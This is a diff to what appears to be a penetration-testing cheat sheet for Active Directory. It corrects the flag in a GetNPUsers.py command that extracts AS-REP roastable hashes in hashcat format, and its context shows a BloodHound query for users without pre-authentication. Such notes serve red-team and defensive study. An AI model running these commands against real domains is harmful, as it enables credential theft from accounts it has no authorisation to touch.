@@ -43,7 +43,7 @@ MATCH (u:User {dontreqpreauth:true}), (c:Computer) RETURN p=shortestPath((u)-[*1
 ### Hash Extraction for ASREP
 - GetNPUsers.py
 ```
-python GetNPUsers.py <DOMAIN>/ -userfile <USERNAMES.TXT> -format hashcat -outputfile <HASHES.DOMAIN.TXT>
+python GetNPUsers.py <DOMAIN>/ -usersfile <USERNAMES.TXT> -format hashcat -outputfile <HASHES.DOMAIN.TXT>
 ```
 - Rubeus.exe
 ```
